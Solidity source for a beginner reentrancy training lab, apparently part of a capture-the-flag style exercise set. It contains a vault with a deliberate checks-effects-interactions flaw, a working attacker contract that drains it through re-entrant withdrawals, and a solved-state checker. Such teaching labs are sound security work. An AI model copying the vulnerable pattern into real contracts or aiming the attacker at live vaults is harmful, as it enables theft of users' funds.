// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice Minimal CEI-violating vault. Identical pattern to q-09 but with a
///         smaller seed so the demonstration fits in a beginner walkthrough.
contract VulnerableMiniVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // BAD: external call before state update.
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

/// @notice Per-user attacker contract. Unlike q-09 the attacker is pre-funded
///         by the lab with `BAIT`, so the user does not have to send ETH along
///         with `attack()`. This keeps the student call sequence to just two
///         transactions: createInstance, then attack.
contract BasicAttacker {
    VulnerableMiniVault public immutable vault;
    address public immutable owner;
    uint256 public immutable attackAmount;

    /// @dev `payable` so the lab can fund the bait at construction time.
    ///      Funding via a `call` would land in `receive()` and trigger the
    ///      re-entrant `vault.withdraw()` before the user even runs `attack()`.
    constructor(VulnerableMiniVault v, address o, uint256 bait) payable {
        require(msg.value == bait, "bait mismatch");
        vault = v;
        owner = o;
        attackAmount = bait;
    }

    /// @notice Triggers the re-entrant drain using the attacker's own balance.
    ///         Caller is `owner` only; no value needs to be attached.
    function attack() external {
        require(msg.sender == owner, "only owner");
        require(address(this).balance >= attackAmount, "no bait funded");
        vault.deposit{value: attackAmount}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw();
        }
    }

    /// @notice Forward all stolen ETH back to the owner. Optional.
    function drain() external {
        require(msg.sender == owner, "only owner");
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

/// @notice Multi-tenant beginner reentrancy lab. Each user calls
///         `createInstance()` once; the lab deploys a fresh
///         `(VulnerableMiniVault, BasicAttacker)` pair, pre-seeds the vault
///         with `SEED` ETH, and funds the attacker with `BAIT` ETH.
///
///         Compared to q-09:
///           - Smaller seed (5 ETH instead of 10).
///           - Bait is funded by the lab, not by the student call.
///           - `attack()` is non-payable — students only send two
///             transactions total.
///
///         The lab itself must hold enough ETH at deploy time to seed every
///         expected instance — see the funded `receive()`.
contract ReentrancyBasicLab is SolvableBase {
    struct Instance {
        VulnerableMiniVault vault;
        BasicAttacker attacker;
    }

    uint256 public constant SEED = 5 ether;
    uint256 public constant BAIT = 0.05 ether;

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address attacker);

    receive() external payable {}

    function createInstance() external returns (address vault, address attacker) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");
        require(address(this).balance >= SEED + BAIT, "lab underfunded");

        VulnerableMiniVault v = new VulnerableMiniVault();
        // Attacker receives the bait at construction time so the student does
        // not have to attach any ETH to their attack call.
        BasicAttacker a = new BasicAttacker{value: BAIT}(v, msg.sender, BAIT);

        // Lab acts as the "victim depositor" — pre-funds the vault.
        v.deposit{value: SEED}();

        _instances[msg.sender] = Instance(v, a);
        emit InstanceCreated(msg.sender, address(v), address(a));
        return (address(v), address(a));
    }

    function vaultOf(address user) external view returns (VulnerableMiniVault) {
        return _instances[user].vault;
    }

    function attackerOf(address user) external view returns (BasicAttacker) {
        return _instances[user].attacker;
    }

    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return address(inst.vault).balance == 0 && address(inst.attacker).balance >= SEED;
    }
}
